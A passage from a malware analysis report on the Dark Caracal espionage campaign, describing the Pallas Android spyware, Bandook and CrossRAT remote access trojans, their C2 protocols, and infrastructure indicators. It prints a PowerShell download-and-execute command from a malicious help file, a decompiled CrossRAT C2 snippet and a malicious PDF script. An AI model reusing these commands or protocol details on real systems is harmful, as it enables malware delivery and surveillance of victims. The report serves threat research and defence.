trigger the Pallas malware samples to do work**\n\nIn all Pallas samples Lookout analyzed, domain information and URL paths are hardcoded as encrypted values. The actor uses\n\nAES encryption and chose to use the secret key of Bar12345Bar12345 and initialization vector of RandomInitVector, which\n\nappears in a post describing how to use AES encryption in Java[13].\n\nExamples of AES encrypted, base64 encoded domains and URL paths present in some Pallas samples include:\n\n - krgbAdOUCGKEnuCRp5s+eE2eMWUktZQR64RBdkNoH/O0NFo9ByRTFhjqa2UX2Y9k\n\n - krgbAdOUCGKEnuCRp5s+eA/hX2erfMp+49exa+8zoZgMlBICjGuOSqrvGRCjgrZ4\n\nThese two examples decrypt to:\n\n - https://adobeair[.]net/wp9/add.php\n\n - https://adobeair[.]net/wp9/upload.php\n\nThe general format of Pallas requests can be written as https://adobeair[.]net/<campaign_identifier>/<add.php or upload.php>.\n\nThe add.php script is used for several operations, including compromised device check-ins as well as C2 instruction execution.\n\nWe also determined that it is able to retrieve location information (GPS data) and general metadata about a victim’s device. The\n\nfollowing table provides additional details around the structure of these requests. In all cases, the Content-Type header is set to\n\napplication/x-www-form-urlencoded. The listed ac parameter identifies the type of request made to the C2.\n\n[13 https://stackoverflow com/questions/15554296/simple-java-aes-encrypt-decrypt-example](https://stackoverflow.com/questions/15554296/simple-java-aes-encrypt-decrypt-example)\n\n\n-----\n\n|Description|Purpose Of The Request|HTTP Parameters(Key=Value) Required|\n|---|---|---|\n|Retrieve data from a compromised device, including text messages, calls, contact information, Wi-Fi details, and accounts. Parameter pr is “1” if sufficient permissions exist, “0” otherwise, and “111111111111”, if the build version of the device is lower than 23.|Check-In with C2|ac=chkcm1 uid=<device_id> pr=<app_has_permisions>|\n|The victim’s GPS location is communicated to the C2 every 120 minutes.|GPS location|ac=chkcm1 uid=<device_id> alt=<Latitude> long=<Longtitude>|\n|Request responsible for gathering general device metadata and uploading to C2. This request is triggered via several entry points including, but not limited to, the creation of the app on the device.|General Device Information|ac=iu uid=<DeviceID> imei=<DeviceID> nb=<None> os=<ReleaseBuildVersion> man=<ManufacturerModel> op=<NetworkOperatorName> wifi=<IsConnectedToNetwork> cam=” <NumberOfCameras> ver=<versionOftheApp> pr=<permisionsGranted> idt=<CurrentDate> ecr=<ExistAcall_record>|\n\n\nResponses from C2 infrastructure to devices infected with Pallas consist of chunks of data separated by a “~!”. The following\n\ntable shows the commands that are currently supported. Some of these require the victim’s device to report back to the C2\n\nand/or upload files to it via HTTP POST requests. The responses to the attacker commands detailed below are handled via the\n\nadd.php page.\n\n\n-----\n\n|Description|C2 Command|HTTP Parameters(Key=Value) Required|\n|---|---|---|\n|Retrieve all the data from a compromised device, including text message, call information, contact details, Wi-Fi data, and account information to name a few.|GALL1||\n|Toggle the call record functionality to on or off.|REC2||\n|Upload file and directory access logs of the trojanized application to the C2 via a single file.|GFILE1||\n|Take a picture using the front or rear camera and upload to the C2 server.|CAMG1||\n|Download an update from attacker infrastructure, attempt to execute it, and notify the C2.|UPD1|ac=REPX uid=<Device_ID> RP=Update Procedure Executed|\n|Delete an attacker-specified file from the device and notify the C2.|DELF1|ac=REPX uid=<Device_ID> RP=File Deleted : <file_name>|\n|Retrieve an attacker-specified file from a compromised device, uploading it to the C2.|UPF1||\n|Download an attacker-specified file to the target device and notify the C2.|DWN1|ac=REPX uid=<Device_ID> RP=File Uploaded To Target : <file_name>|\n|Record an MPEG4 audio file (.mp4) for an attacker-specified duration. Audio is captured with the device’s microphone, and once complete is uploaded to the C2 server.|REC1|ac=REPX uid=<Device_ID> RP=Microphone Already in use by another app|\n|Performs the same functionality as detailed above for the REC1 command with the exception that the file is stored locally on external storage under the path .Temp/srec|SMS1|ac=REPX uid=<Device_ID> RP=Microphone Already in use by another app|\n|Send a text message to an attacker-specified number.|SMS1|ac=REPX uid=<Device_ID> RP=SMS sent to<destinationAddress>|\n|Displays an alert with a phishing theme on a compromised device with the intention of stealing the victim’s credentials. Any entered credentials are sent to attacker servers.|PWS1|ac=PPWS uid=<Device_ID> PS=<victim’s credentials>|\n|Checks the Android build on the device as well as the permissions of the app.|PRM1||\n|If the installed Pallas sample is a trojanized version of Telegram, WhatsApp, Threema, or Primo, then retrieve their databases and, if present, associated keys.|WT1||\n|Create a zip file of the shared_pref for the installed Pallas app and upload it to C2 infrastructure.|SHPR|ac=GTMBF TFX=<a string set by C2>|\n|Manipulate Bitmap images, convert to JPG, and upload to C2.|SILF||\n|Same operation as SILF but on a directory of images.|SIFO|ac=GTMBF TFX=<a string set by C2>|\n|Split an attacker-specified file into chunks, saving them to external storage under the path .Temp/spd/.|SPLT1|ac=REPX uid=<Device_ID> RP=<fileName> Splitted|\n\n\nCreate a zipfile of the contents of an attacker-specified directory and upload it ZDIR1\nto a C2 server.\n\n\n-----\n\nPallas handles the exfiltrated data server-side via the upload.php script. This accepts HTTP POST requests that have the following\n\nheaders and structure, where op_id specifies the type of file being uploaded.\n\n\nPOST\nRequest properties\nConnection : Keep-Alive\nENCTYPE : multipart/form-data\nContent-Type : multipart/form-data;boundary=*****\nUploaded_file : <abs_path_file_on_victim_device>\nupload.php?test=<app_id>&op=<op_id>&rn=<>&extra=<>&extra2=<>[&FLS=\n<>&RLD=<>]\n\n--*****\\r\\n\n\nContent-Disposition: form-data; name=\\”uploaded_file\\”;filename=\\<abs_path_file_on_victim>\\\\r\\n\n\\r\\n\n\n<data_from_victim_to_upload>\\r\\n\n--*****--\\r\\n\n\n\nWhen Pallas receives the GALL1 instruction, it uploads exfiltrated data as a zip archive or saves it as a .db file. For most .db files,\n\neach line is base64 encoded and prepended with the string “*#@”. When decoded, each line translates to a piece of exfiltrated\n\ndata. Each piece of information is associated with a content keyword or data type. This can be represented as follows:\n\n<DataType><separator>[<field><separator>...<field><separator>]\n\n\n-----\n\nAnalysis of all known Pallas samples seen to date has resulted in the identification of the following 10 data types:\n\n###### Data Data Type Fields Description\n\nSMS A0X01 date All SMS fields are set according to\naddress the Android SMS content provider\nbody documentation[14]\nid is the address of the other party and\ntype the type may be any of the following\n\nvalues:\n\n**•** “0” : ALL\n\n**•** “1”: INBOX\n\n**•** “2”: SENT\n\n**•** “3”:”DRAFT”\n\n**•** “4”:OUTBOX\n\n**•** “5”:FAILED\n\n**•** “6”: QUEUED\n\nContacts A0X02 Display_name All contacts fields are set according\nData1 to the Android ContactsContract\nTimes_contacted documentation[15].\nLast_time_contacted\n\nCalls A0X03 Number All contacts fields are set according to\nType the Android documentation for phone\nDate calls[16 ]\nDuration any of the following values:\n\n**•** ”INCOMING”\n\n**•** ”OUTGOING”\n\n**•** “MISSED”\n\n**•** ”null”\nDate is in the standard Java SQL DATE\nformat[17].\n\nInstalled package A0X04 Application_label Specifies the list of installed packages\nPackage_name on a victim’s device.\nVersion_name\nVersion_code\n\nBrowsing History A0X05 Page_title Specifies the web pages a victim\nPage_URL has visited.\n\n[14 https://developer.android.com/guide/topics/providers/content-provider-basics.html](https://developer.android.com/guide/topics/providers/content-provider-basics.html)\n\n[15 https://developer.android.com/reference/android/provider/ContactsContract.CommonDataKinds.Phone.html](https://developer.android.com/reference/android/provider/ContactsContract.CommonDataKinds.Phone.html)\n\n[16 https://developer.android.com/reference/android/provider/CallLog.Calls.html](https://developer.android.com/reference/android/provider/CallLog.Calls.html)\n\n[17 https://docs oracle com/javase/7/docs/api/java/sql/Date html](https://docs.oracle.com/javase/7/docs/api/java/sql/Date.html)\n\n|Data|Data Type|Fields|Description|\n|---|---|---|---|\n|SMS|A0X01|date address body id type|All SMS fields are set according to the Android SMS content provider documentation14 in which the address is the address of the other party and the type may be any of the following values: • “0” : ALL • “1”: INBOX • “2”: SENT • “3”:”DRAFT” • “4”:OUTBOX • “5”:FAILED • “6”: QUEUED|\n|Contacts|A0X02|Display_name Data1 Times_contacted Last_time_contacted|All contacts fields are set according to the Android ContactsContract documentation15.|\n|Calls|A0X03|Number Type Date Duration|All contacts fields are set according to the Android documentation for phone calls16 in which type is a string with any of the following values: • ”INCOMING” • ”OUTGOING” • “MISSED” • ”null” Date is in the standard Java SQL DATE format17.|\n|Installed package|A0X04|Application_label Package_name Version_name Version_code|Specifies the list of installed packages on a victim’s device.|\n|Browsing History|A0X05|Page_title Page_URL|Specifies the web pages a victim has visited.|\n\n\n-----\n\n(continued from page 28)\n\n###### Data Data Type\n\nBookmarks A0X06\n\nWiFi A0X07\n\nAccounts A0X08\n\nAccess Logs MIAMO\n\nAccess Logs D\n\nAccess Logs F\n\n18 https://developer android com/reference/android/net/wifi/ScanResult html\n\n|Data|Data Type|Fields|Description|\n|---|---|---|---|\n|Bookmarks|A0X06|Bookmark_Title Bookmark_URL|Specifies the web pages a victim has bookmarked.|\n|WiFi|A0X07|SSID Capabilities Level Frequency BSSID|All the fields are defined in Android scan result documentation18.|\n|Accounts|A0X08|Name Type|Name is the account name of a victim and type is the authenticator name of that account.|\n|Access Logs|MIAMO|App_name App_path String1|Specifies a “.db” file that contains File and Directory access logs of a trojanized app. The “MIAMO” information line is always the first line in such files. App_path is always a path that a Pallas sample has access to, for example, the SDCard or the application’s data folder. String1 is either set to “NO” or an absolute path.|\n|Access Logs|D|Directory_path Directory_name|Directories that the app has accessed. Only exists in a file with “MIAMO” as the first line.|\n|Access Logs|F|File_path File_name File_length LasModifiedTime|Files that the app has accessed. Only exists in a file with “MIAMO” as the first line.|\n\n\n-----\n\n###### Previous Use of FinFisher Spyware\n\nIn addition to the Pallas samples, we discovered a previously unreported FinFisher sample[19] on the tweetsfb[.]com server.\n\nIt is unclear whether this sample was a demo provided to this actor or if the actor came across it via other means.\n\nThe date of package and compilation for this sample is 2014-03-27 17:26:14 UTC.\n\nBelow is the extracted configuration and relevant details of this sample.\n\nTitle: Android Update\nPackage Name: com.esn.wal\nSHA1: 835befd9376f90a12892876b482c1dcc39643a09\nMD5: d965c3736e530bfdbfde2cc6a264f2aa\n\nRequestID : 0 C2 Phone Added : +7820435193\n\nMobileTargetUID : 0 VoicePhone Added : +7820944266\n\nVersion : 0 VoicePhone Added : +78235424312\n\nMobileTargetID : nana Logging : 0\n\nHeartBeatInterval : 120 C2 : 180.235.133.57\n\nTrojanID : nana Ports: 21, 53, 443, 4111\n\nTrojanUID : 03FDAF68 Included exploits - Exynos Abuse\n\nUserID : 1000 Installed Modules\n\n**•** SMS\n\nMaxInfections : 30 **•** Phone log collection\n\n**•** Call recording\n\nRemovalAtDate : 0 **•** Device tracking\n\nRemovalIfNoProxy : 0\n\n[19 https://en.wikipedia.org/wiki/FinFisher](https://en.wikipedia.org/wiki/FinFisher)\n\n|Title: Android Update Package Name: com.esn.wal SHA1: 835befd9376f90a12892876b482c1dcc39643a09 MD5: d965c3736e530bfdbfde2cc6a264f2aa|Col2|\n|---|---|\n|RequestID : 0|C2 Phone Added : +7820435193|\n|MobileTargetUID : 0|VoicePhone Added : +7820944266|\n|Version : 0|VoicePhone Added : +78235424312|\n|MobileTargetID : nana|Logging : 0|\n|HeartBeatInterval : 120|C2 : 180.235.133.57|\n|TrojanID : nana|Ports: 21, 53, 443, 4111|\n|TrojanUID : 03FDAF68|Included exploits - Exynos Abuse|\n|UserID : 1000|Installed Modules • SMS • Phone log collection • Call recording • Device tracking|\n|MaxInfections : 30||\n|RemovalAtDate : 0||\n|RemovalIfNoProxy : 0||\n\n\n-----\n\n###### Surveillanceware - Desktop Components\n\nThe desktop malware component exists in a range of file types, including executables, zip archives, PDFs, and Microsoft’s\n\ncomposite document file format. No zero days or publicly known exploits were located in these files and, based on several of\n\nthe documents, the primary attack vector is believed to be social engineering via spear-phishing. Analysis into Dark Caracal’s\n\ndesktop tooling did result in the discovery of a new cross-platform Java RAT known as CrossRAT and confirmed that this actor\n\nis using new variants of the Bandook family.\n\n###### Bandook\n\nThe Bandook RAT was originally identified during EFF’s Operation Manul research, however, this investigation surfaced new\n\nvariants belonging to this family. Written in Delphi and targeting Windows operating systems, Bandook samples are packed at\n\nmultiple stages in order to both evade detection and slow down the process of reverse engineering by security analysts. At the\n\ntime of writing, 19 out of 63 antivirus engines on the malware repository VirusTotal flagged most Bandook samples as malicious.\n\nFirst stage samples of the version of Bandook used by Dark Caracal include what appears to be a drawing program and a\n\ntrojanized version of the Psiphon circumvention software[20]. While the drawing application was not fully functional and did not\n\nprovide a user interface when launched, the modified version of Psiphon contained the complete legitimate functionality of the\n\noriginal application.\n\nThe first stage malware is signed with a valid SSL certificate issued by Certum CA for Ale Couperus (alecouperus@mail[.]com).\n\nWe have identified several distinct samples signed with this certificate. This suggests that the actors behind these samples\n\ncontrol the private key for this certificate and have the ability to sign arbitrary packages. It is unclear at this time whether the\n\nprivate key associated with this certificate has been stolen or if the attackers obtained it via legitimate sources.\n\nUpon initial execution, the first stage of Bandook decrypts several strings that are stored in the data section and base64\n\nencoded. Below is the plaintext of some of these strings, which we can see as Windows API calls.\n\n20 SHA256 hash: ed25b0c20b1c1b271a511a1266fe3967ab851aaa9f793bdf4f3d19de1dcf6532\n\n\n-----\n\n**Figure 25: Decoded strings from the Bandook sample**\n\nThe malware uses these API calls to decrypt Bandook’s second stage, an embedded resource. This resource is a randomly\n\nnamed eight-character string of uppercase letters and numbers. During our research, we only observed the numbers two and\n\nthree being used and these were often positioned towards the end of the string. Following the decryption of the second stage,\n\nthe iexplore.exe binary is started and immediately replaced with the loaded resource. This is a technique known as “process\n\nhollowing[21]”.\n\nThe second stage Bandook samples are occasionally packed with the following modified UPX packer “UPX Modified >> *$igBy\n\nAhmed18”. Not all second stages were packed indicating that the authors may be actively developing the malware. As expected,\n\nthe core malicious functionality resides in the second stage, which attempts to implant itself in the system and contact command\n\nand control infrastructure for further instructions. At this point, the malware has the ability to start new processes, manipulate the\n\nfile system and registry, take screen captures, escalate privileges, create mutexes, get system information, execute commands,\n\nget window names, and beacon to infrastructure.\n\n[21 https://attack mitre org/wiki/Technique/T1093](https://attack.mitre.org/wiki/Technique/T1093 )\n\n\n-----\n\nBandook communication with attacker infrastructure takes place over a TCP port with HTTP payloads Base64 encoded and\n\nsuffixed with the string “&&&”. The following is an example of a decoded communication from an infected system:\n\n\n@0000~!18128~!192.168.1.82~!610930~!EFFuser~!Seven~!0d 0h\n3m~!0~!4.1~!21/04/2017~!0~!0~!0~!0~!~!0~!0--~!None~!0~!\n\n\nInstructions sent from Dark Caracal infrastructure to Bandook compromised systems make use of “~!” as a delimiter, the\n\nsame approach used by the Pallas Android malware. This suggests there is a possibility Bandook and Pallas were written by\n\nthe same author or that the author of one was inspired by the authors of the other. We found Bandook supports the following\n\nset of commands.\n\nCaptureScreen DeleteFileFromDevice DeleteAutoFTPFromDB\n\nInit CopyMTP ExecuteTV\n\nClearCred ChromeInject ExecuteAMMY\n\nGetCamlist DisableChrome DDOSON\n\nSendCam RarFolder ExecuteTVNew\n\nStopCam SendUSBList getkey\n\nUninstall SignoutSkype SendMTPList\n\nCompressArchive StealUSB SendMTPList2\n\nGenerateReports StartFileMonitor GrabFileFromDevice\n\nGetWifi SendFileMonLog PutFileOnDevice\n\nStartShell GetUSBMONLIST StopFileMonitor\n\nGetSound GetFileMONLIST SendinfoList\n\nSplitMyFile StopUSBMonitor EnableAndLoadCapList\n\nGetAutoFTP SearchMain DisableMouseCapture\n\nSendStartup StopSearch AddAutoFTPToDB\n\nFrom this, we can infer some additional functionality, including the ability to view the victim’s webcam, record sound, get Wi-Fi\n\nconnections, manipulate USB devices, manipulate the Chrome browser, sign the victim out of Skype, search for files, upload new\n\nfiles to the device, execute secondary infections, or participate in a DDOS attack.\n\nSystems infected with this Bandook variant contain a copy of the first stage in the path C:\\Users\\user\\AppData\\\n\nRoaming\\%appname%\\%appname%.exe. Similarly, in such cases, autostart registry keys are written with the same name as the\n\ndropped file to HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n\n|CaptureScreen|DeleteFileFromDevice|DeleteAutoFTPFromDB|\n|---|---|---|\n|Init|CopyMTP|ExecuteTV|\n|ClearCred|ChromeInject|ExecuteAMMY|\n|GetCamlist|DisableChrome|DDOSON|\n|SendCam|RarFolder|ExecuteTVNew|\n|StopCam|SendUSBList|getkey|\n|Uninstall|SignoutSkype|SendMTPList|\n|CompressArchive|StealUSB|SendMTPList2|\n|GenerateReports|StartFileMonitor|GrabFileFromDevice|\n|GetWifi|SendFileMonLog|PutFileOnDevice|\n|StartShell|GetUSBMONLIST|StopFileMonitor|\n|GetSound|GetFileMONLIST|SendinfoList|\n|SplitMyFile|StopUSBMonitor|EnableAndLoadCapList|\n|GetAutoFTP|SearchMain|DisableMouseCapture|\n|SendStartup|StopSearch|AddAutoFTPToDB|\n\n\n-----\n\n###### CrossRAT\n\nWhile investigating the axroot[.]com domain, we discovered a new remote access trojan called CrossRAT that we believe was\n\ndeveloped by, or for, Dark Caracal. Written in Java with the ability to target Windows, Linux, and OSX, CrossRAT is able to\n\nmanipulate the file system, take screenshots, run arbitrary DLLs for secondary infection on Windows, and gain persistence on\n\nthe infected system.\n\nWhen executed in a Windows environment, CrossRAT attempts to copy itself to %AppData%\\Local\\ Temp\\mediamgrs.jar before,\n\nlike Bandook, creating an auto-start registry key in HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with the\n\nname “mediamgrs”.\n\nOn OSX and Linux, it attempts to write a copy of itself to /usr/var/mediamgrs.jar. If CrossRAT does not have sufficient permissions\n\nto write to this directory, it will fail back to the following path under the user’s home directory: $HOME/Library/mediamgrs.jar.\n\nFor CrossRAT installations on OSX, a Launch Agent is created under $HOME/Library/ LaunchAgents/mediamgrs.plist to ensure\n\nthat it will be launched again when the computer restarts. When on Linux, this persistence is achieved by writing an autorun file\n\nto $HOME/.config/autostart/mediamgrs.desktop.\n\nCrossRAT performs communications to its C2 infrastructure via a TCP socket. The following is an example of content sent over\n\nthe wire from a compromised machine:\n\n\n5287249f-caa2-4b66-850c-49eedd46cf47$#@@0000$#@192.168.1.16$#@Windows\n7$#@6.1$#@EFFuser^585948$#@0.1$#@GROUP2$#@&&&\n\n\nCrossRAT uses a similar structure to Pallas and Bandook when communicating with infrastructure. Specifically, it uses &&& to\n\nterminate the response string and uses @### to start command strings.\n\nBelow is a code snippet from a CrossRAT sample. The response prefixes, hard coded C2 server of flexberry[.]com, and fixed\n\nport of 2223, are clearly visible.\n\n\npublic final class k\n{\npublic static boolean a = false;\n\n// Hardcoded C2 Information\npublic static String b = “flexberry.com”; // C2 Server\npublic static int c = 2223; // C2 Port\n\n\n-----\n\n(continued from page 34)\n\n\npublic static String d = “$#@”; // Argument delimiter\npublic static String e = “^!@”; // delimiter within arguments\npublic static UUID f;\npublic static String g;\npublic static Preferences h;\npublic static String i = “0.1”; // Version Number\npublic static String j = “GROUP2”; // Campaign name\npublic static Socket k;\npublic static Socket l;\n\n// Server command prefixes\npublic static String m = “@0000”; // Enumerate root directories on the system. 0 args\npublic static String n = “@0001”; // Enumerate files on the system. 1 arg\npublic static String o = “@0002”; // Create blank file on system. 1 arg\npublic static String p = “@0003”; // Copy File. 2 args\npublic static String q = “@0004”; // Move file. 2 args\npublic static String r = “@0005”; // Write file contents. 4 args\npublic static String s = “@0006”; // Read file contents. 4 args\npublic static String t = “@0007”; // Heartbeat request. 0 args\npublic static String u = “@0008”; // Get screenshot. 0 args\npublic static String v = “@0009”; // Run a DLL (windows only). 1 arg\n\n// Client response prefixes\npublic static String w = “@0000”; // client hello\npublic static String x = “@0001”; // heartbeat response\npublic static String y = “@0002”; // List of system root directories\npublic static String z = “@0003”; // Status message for file manager connect, unimplemented\npublic static String A = “@0004”; // Status message for file manager connect, unimplemented\npublic static String B = “@0005”; // List of files on system\npublic static String C = “@0006”; // End list of files on system\npublic static String D = “@0007”; // file created status message\npublic static String E = “@0008”; // file written status message\npublic static String F = “@0009”; // file moved status message\npublic static String G = “@0010”; // file write status\npublic static String H = “@0011”; // file read status and file contents\npublic static String I = “@0012”; // send screenshot contents\npublic static String J = “@0013”; // Run DLL status message\npublic static String K; // Filepath for CrossRAT\n\n\nAnalysis of CrossRAT shows that it has a version number of 0.1, which indicates that its malicious capabilities are still under\n\ndevelopment. Implemented functionality includes the ability to enumerate attacker-specified directories, copy / move / read\n\nfiles, beacon to C2 infrastructure, run attacker specific libraries (Windows only), and create empty files. The CrossRAT sample\n\nwe discovered was last modified in March of 2017.\n\n\n-----\n\n###### Infected Documents\n\nWe identified several Word documents which appear to be intended for use as infection vectors in phishing attacks.\n\nNone of the documents appear to contain any exploits, but rather rely on macros to run malicious code on a target\n\nsystem. If executed in an environment that has macros enabled, the malware downloads its second stage components.\n\nWe saw this same process in numerous malicious PDF files that used javascript to download secondary stages. The\n\nfollowing script is an example of this functionality, which is identical to the malicious Word doc with the SHA256 hash\n\ne5eeb0a46dac58b171ebcefec60e9ff351fc7279d95892c6f48f799a1a364215 (Word macro fixed.doc).\n\n\nvar v = app.viewerVers, ion;\nif (v < 7) {\nvar n = 0;\nif (this.dataObjects != null) n = this.dataObjects.length;\nif (v >= 5 && v < 6 && n > 0 && (app.viewerVariation == “Full” || app.viewerVariation ==\n“Fill-In”)) {\nif (this.external\\) app.alert(“This document has file attachments. To view the\nattachments, click the Save button to save a copy of the document, open the copy in Acrobat,\nand use the File > Document Properties > Embedded Data Objects menu.”, 3, 0);\nelse app.\\alert(“This document has file attachments. Use the File > Document Properties\n\n- Embedded Data Objects menu to view the attachments.”, 3, 0);\n} else if (v >= 6 && v < 7) {\nif (n == 0) {\nvar np = this.numPages;\nsyncAnnotScan();\\\nfor (var p = 0; p < np && n == 0; ++p) {\nvar annots = this.getAnnots(p);\nif (annots != null) {\nfor (var i = 0; i < annots.length; ++i) {\nif (annots[i].type == “FileAttachment”) {\nn = 1;\\\nbreak;\n}\n}\n}\n}\n}\nif (n > 0) {\nif (this.external) app.alert(“This document has file attachments. To view the\nattachments, click the black triangle at the top of the document window’s vertical scrollbar\nand \\\nchoose File Attachments.”, 3, 0);\nelse app.alert(“This document has file attachments. Use the Document > File\nAttachments menu to view the attachments.”, 3, 0);\n}\n}\n}\n\n--this.exportDataObject({ cName: “BL920123.doc”, nLaunch: 2 });\n\n\n-----\n\n**Figure 26: An observed malicious Word file that, when executed, attempts to run macros in order to download**\n\nand execute Bandook stage one\n\n###### Other Samples\n\nSurprisingly, we also observed a malicious Microsoft Compiled HTML Help file with the .chm extension. Primarily used for\n\nsoftware documentation, .chm files were first introduced with the release of Window 98. However, they are still supported in\n\nWindows 7. The chm file attempts to execute a command via Powershell that downloads an additional file called ne.abc from\n\nthe server cma-cgrm[.]com. Below is the command contained in the malicious .chm file.\n\n\ncmd.exe,/c powershell.exe -ExecutionPolicy bypass -noprofile\n\n-WindowStyle Hidden (New-Object\n\nSystem.Net.WebClient).DownloadFile(‘https://cma\ncgrm[.]com/ebusiness/ne.abc’,’%TEMP%\\chmplg.exe’);Start-Process\n\n%TEMP%\\chmplg.exe;\n\n\nAt the time of analysis, this server was no longer live and, as such, the associated ne.abc binary has not yet been acquired and\n\ndoes not appear on VirusTotal. The cma-cgrm[.]com domain is not obviously connected with other infrastructure.\n\n\n-----\n\n### Infrastructure\n\nWhile analyzing adobeair[.]net, we uncovered sprawling infrastructure used by Dark Caracal. This infrastructure serves a broad\n\nset of purposes, including acting as storage for exfiltrated data, masquerading as an Android App Store hosting malware,\n\ndelivering attacker commands to infected devices, and providing phishing content aimed at gathering credentials for various\n\nwell known services.\n\nWe found much of this infrastructure hosted on servers provided by Shinjiru, an offshore bulletproof hosting provider that allows\n\nits customers to host almost any content. WHOIS information listed for the adobeair[.]net C2 server led to the discovery of many\n\nof these domains, as did scanning of Shinjiru IP blocks for servers running a set of services. This acted as a fingerprint for Dark\n\nCaracal’s infrastructure. To date, the following domains and IPs have been identified as connected to the infrastructure used\n\nby Dark Caracal.\n\n|Domain|Links / Connection to Dark Caracal|\n|---|---|\n|adobeair[.]net|Shared C2 server / Exfiltrated data server|\n|secureandroid[.]info|Blackmarket “Android App Store”|\n|tweetsfb[.]com|Watering hole, Facebook groups, used to phish credentials, running Apache Win32|\n|fbarticles[.]com|Phishing domain linked by WHOIS (op13)|\n|Arablivenews[.]com [EXPIRED]|WHOIS (op13)|\n|Nancyrazzouk[.]com [EXPIRED]|WHOIS (nancyrazzouk)|\n|Arabpublisherslb[.]com|WHOIS (nancyrazzouk)|\n|flexberry[.]com|94[.]229[.]70[.]7 (Windows)|\n|planethdx[.]com|94[.]229[.]70[.]7 (Windows)|\n|globalmic[.]net|94[.]229[.]70[.]7 (Windows)|\n|megadeb[.]com|94[.]229[.]70[.]7 (Windows)|\n|opwalls[.]com|94[.]229[.]70[.]7 (Windows)|\n|mecodata[.]com|94[.]229[.]70[.]7 (Windows)|\n|sabisint[.]com|94[.]229[.]70[.]7 (Windows)|\n|roxsoft[.]net|94[.]229[.]70[.]7 (Windows)|\n|axroot[.]com|Windows malware campaign|\n|skypeupdate[.]com|Windows malware campaign|\n|playermea[.]com|Windows malware campaign|\n|kaliex[.]net|Windows malware campaign|\n|tenoclock[.]net|Windows malware campaign|\n|ancmax[.]com|Windows malware campaign|\n\n\n-----\n\nThe following relevant contact information has also been identified during this investigation.\n\n###### Email Link/Context\n\nop13@mail[.]com Primary email contact for C2 server. Associated with “rami jabbour” “Hadi Maz\n\nnancyrazzouk@mail[.]com nancyrazzouk\n\nhicham.dika@mail[.]com SSL cert in exe\n\nhetemramadani5@gmail.com SSL cert in exe\n\nalecouperus@mail.com SSL cert in exe\n\n###### Primary Command and Control Server\n\nAs noted, adobeair[.]net is hosted on Shinjiru. This bulletproof hosting company allows its customers to host almost any type of\n\ncontent, protects client identity, accepts Bitcoin for payment, and is more resilient than other providers to takedowns[22]. Shinjiru\n\nhas also been used to host many of the Dark Caracal Windows domains dating back over seven years to April 27th, 2010\n\n(see a list of Windows malware domains in the Windows infrastructure section below).\n\nAt the time of writing, adobeair[.]net is currently live and running a fairly unique set of services. We have used this server as a\n\nfingerprint in the discovery of further related infrastructure. These services include XAMPP for Windows 5.6.31, Apache 2.4.26,\n\nMariaDB 10.1.25, PHP 5.6.31, phpMyAdmin 4.7.0, and OpenSSL 1.0.2. We confirmed these via an nmap scan of the adobeair server.[23]\n\n**Figure 27: Nmap scan of adobeair[.]net**\n\n[22 https://www.shinjiru.com/company/about-us/](https://www.shinjiru.com/company/about-us/ )\n\n|Email|Link/Context|\n|---|---|\n|op13@mail[.]com|Primary email contact for C2 server. Associated with “rami jabbour” “Hadi Maz|\n|nancyrazzouk@mail[.]com|nancyrazzouk|\n|hicham.dika@mail[.]com|SSL cert in exe|\n|hetemramadani5@gmail.com|SSL cert in exe|\n|alecouperus@mail.com|SSL cert in exe|\n\n\n-----\n\nThe adobeair[.]net C2 server had the Apache mod_status module enabled. This provides operators with information on server\n\nactivity, performance, and a statistics page under /server-status that details connected clients and the server resources they are\n\naccessing. By programmatically monitoring this page, we were able to determine the source IPs of infected clients and admins\n\nlogging into the console.\n\nThe adobeair[.]net server has, as of late September 2017, been moved to a new hosting provider, M247, and the operators have\n\nimproved the security.\n\nWHOIS history for adobeair[.]net lists Nancy Razzouk with an email address of op13@mail[.]com as the registrant. We have identified\n\nthe “Nancy Razzouk” persona as the SSL signer of the Windows malware samples and the registrant of multiple domains. Its reuse\n\nhas helped identify further Dark Caracal infrastructure.\n\n**Figure 28: WHOIS information for adodeair[.]net as observed in August 2017**\n\n\n-----\n\n###### Watering Hole Server\n\nDuring this investigation, we determined this server is the only infrastructure we discovered that serves up malicious apps\n\nbelonging to the Pallas malware family. A detailed analysis of these applications can be found under the Android Surveillanceware\n\nsection. As with other Dark Caracal infrastructure, the secureandroid[.]info domain was also registered with the bulletproof hosting\n\ncompany Shinjiru.\n\n**Figure 29: Screenshot of the secureandroid[.]info watering hole server, a**\n\ndistribution point for Pallas\n\nWe found links to these landing pages in the exfiltrated content of compromised devices, which indicates it is actively being used\n\nduring the attack chain. As of December 2017 it appears that secureandroid[.]info has had its domain expire.\n\n###### Phishing Domains\n\nWe identified the Dark Caracal domain tweetsfb[.]com while analyzing the secureandroid[.]info server source code. We identified\n\ntwo bit[.]ly URLs on this server that resolve to other pages on the tweetsfb site that were carefully crafted to look like the Facebook\n\nand Twitter login portals. The copyright dates suggest these pages are clones of the originals from 2015.\n\n**Figure 30: Dark Caracal clones of Twitter and Facebook login portals**\n\n\n-----\n\nThese bit[.]ly links and their respective resolving links are:\n\n - http://bit[.]ly/2j3r285 points to\n\nhttp://www.tweetsfb[.]com/services/100001472583690/twitter/articles/100001/\n\n - http://bit[.]ly/2iByHcu points to\n\nhttp://tweetsfb[.]com/services/100001472583690/facebook/groups/100002/\n\nThe tweetsfb[.]com domain was found to share an IP address (172.94.17.147) with the following additional domains.\n\n**Figure 31: Domains sharing the same IP address as tweetsfb[.]com**\n\nWe were able to find additional phishing campaigns in VirusTotal that referenced fbarticles[.]com. While fbarticles was registered\n\nby the op13@mail[.]com address with the name “Hadi Mazeh,” the WHOIS information for fbtweets was private.\n\n**Figure 32: Detections in VirusTotal for fbarticles[.]com**\n\n\n-----\n\n**Figure 33: Detections in VirusTotal for the IP address that hosted fbarticles[.]com**\n\nNote: we identified three further domains — “facebookservices[.]org”, “gmailservices[.]org”, and “twiterservices[.]org” that were\n\nonce a part of this campaign. Those domains now appear to be sinkholed.\n\nWhen we discovered these domains, the threat actors had already taken them offline and another individual had purchased\n\nthem. This individual is associated with unrelated domains that are connected to other APT reports. However, we noticed that\n\nthe individual purchased the domains after the APT reports went public. While we’re not sure why this individual is purchasing,\n\nsinkholing, and monitoring these domains, we think it’s an interesting note.\n\n\n-----\n\n###### Windows C2 Servers\n\nThe Windows server infrastructure has a much longer history than the Android infrastructure, showing that the actors are willing\n\nto evolve to new technologies, such as mobile, as they become more valuable targets.\n\nThe Windows malware servers hosted control panels for multiple campaigns using various malware that 